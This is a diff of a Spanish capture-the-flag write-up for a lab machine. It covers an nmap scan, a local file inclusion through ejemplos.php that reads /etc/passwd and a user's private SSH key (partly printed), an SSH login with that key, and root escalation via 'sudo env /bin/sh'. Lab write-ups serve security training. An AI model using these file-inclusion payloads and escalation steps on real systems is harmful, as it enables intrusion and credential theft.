@@ -24,7 +24,8 @@ MAC Address: 5E:17:D0:42:D8:82 (Unknown)
 
 - Puerto 80 y 22 abiertos
 
-Realizo un segundo escaneo para ver que servicios y versiones están corriendo
+Sobre los puertos abiertos realizo un segundo escaneo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.
+
 ```bash
 nmap -p 22,80 -sCV -sS -T5 --min-rate 5000 -Pn -n -oN target.txt 172.17.0.2
 ----------------------------------------------------------------------------
@@ -44,26 +45,38 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ```
 
+- Puerto 22 SSH: OpenSSH 9.2p1 Debian 2+deb12u3
+- Puerto 80 HTTP:  Apache httpd 2.4.61
+
 ## Enumeración
 
-**Puerto 80**
+### **Puerto 80**
+
+Al parecer es una pagina donde me clavaron un virus.......
+
 ![](assets/Pasted%20image%2020251105001227.png)
 
-Al darle al boton de ejemplos de computadoras infectadas nos lleva a esta otra vista:
+Al darle al boton de ejemplos de computadoras infectadas nos lleva a esta otra vista
+
+- Podemos notar que el parametro `images` es quien esta listando el archivo `ejemplo1.png`
+
 ```
 > http://172.17.0.2/ejemplos.php?images=./ejemplo1.png
 ```
 
 ![](assets/Pasted%20image%2020251105002745.png)
-- La web tiene un parametro que esta tratando de traerse un archivo y mostrarlo en la web por lo que me hace pensar que puede ser vulnerable a un Local File Inclution.
+
+- Podemos notar que el parametro `images` cuyo valor es la ruta del archivo `ejemplo1.png` es quien esta tratando de listar el archivo.
 ## Explotación
 
-Sabiendo que la web esta tratando de traerse un archivo, lo que hice fue tratar de apuntar al archivo */etc/passwd* para ver si la web lo volcaba.
+Sabiendo que la web esta tratando de listar un archivo, lo que hice fue tratar de apuntar al archivo */etc/passwd* para ver si la web lo listaba correctamente.
+
 ```
 > ejemplos.php?images=/etc/passwd
 ```
 
-La pagina volcó correctamente el archivo 
+La web listo correctamente el archivo 
+
 ```
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -90,15 +103,21 @@ sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
 nico:x:1000:1000:,,,:/home/nico:/bin/bash ---------------------------------------------------
 ```
 
-- Lo primero que me llamo la atención fue el usuario _nico_
-_nico:x:1000:1000:,,,:/home/nico:/bin/bash_
+- Podemos notar que existe un usuario llamado nico.
 
-Por lo cual ahora sabiendo que existe un usuario llamado nico trate de apuntar a su clave _ssh_
+```
+nico:x:1000:1000:,,,:/home/nico:/bin/bash_
+```
+
+
+Sabiendo que el servicios `SSH` esta abierto, es posible que el usuario nico tenga alguna clave privada. Por lo cual aprovechándome del LFI puedo tratar de apuntar a dicha clave.
+
 ```
 > ejemplos.php?images=/home/nico/.ssh/id_rsa
 ```
 
-La web efectivamente me volcó la clave ssh del usuario nico.
+La web efectivamente list la clave ssh del usuario nico.
+
 ```
        -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
@@ -107,13 +126,15 @@ NhAAAAAwEAAQAAAYEA07BRWc6X8Yz+VwO1l5UAqcFE5K+1yQ9QxFBrt8DzyC9x7o0tluCk
 ```
 
 Procedí a guardar la clave en mi sistema y a darle permisos.
+
 ```bash
-> chmod 600 key
+> chmod 600 id_rsa
 ```
 
 Me conecto mediante SSH
+
 ```bash
-> ssh -i key nico@172.17.0.2
+> ssh -i id_rsa nico@172.17.0.2
 ----------------------------------------------------------------------------------------------------
 Linux 151ebf5d80e7 6.12.32-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.32-1parrot1 (2025-06-27) x86_64
 Last login: Wed Aug 21 21:11:09 2024 from 172.17.0.1
@@ -124,7 +145,7 @@ nico
 
 ## Escalada de Privilegios
 
-Hacemos un `sudo -l` para listar binarios que podamos ejecutar como usuario root 
+Lo primero que hago es enumerar binarios que pueda ejecutar como `root`. 
 
 ```bash
 > sudo -l
@@ -136,9 +157,10 @@ User nico may run the following commands on 151ebf5d80e7:
     (ALL) NOPASSWD: /bin/env
 ```
 
-- Encontramos que el binario _env_ puede ser ejecutado como root
+- Encontramos que el binario _env_ puede ser ejecutado como cualquier usuario sin necesidad de contraseña
 
-Procedimos a buscar en **GTFObins** la manera de explotar el binario env
+Con ayuda de [GTFObins](https://gtfobins.github.io/gtfobins/env/) abuso del binario y escalo al usuario `root`.
+
 ```bash
 > nico@151ebf5d80e7:~$ sudo -u root env /bin/sh                                                                                                                                
 > whoami
